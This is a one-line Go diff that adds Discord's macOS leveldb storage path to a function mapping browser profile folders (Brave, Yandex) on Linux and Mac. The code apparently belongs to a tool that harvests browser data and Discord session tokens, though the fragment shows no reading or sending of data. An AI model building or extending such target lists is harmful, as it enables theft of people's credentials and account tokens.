@@ -58,6 +58,7 @@ func getPathLinuxAndMac() (paths map[string]string) {
 		"Brave":          homedir + "/.config/BraveSoftware",
 		"Yandex Beta":    homedir + "/.config/yandex-browser-beta/Default",
 		"Yandex":         homedir + "/.config/yandex-browser/Default",
+		"Discord Mac":    homedir + "/Library/Application Support/discord/Local Storage/leveldb",
 	}
 
 	return
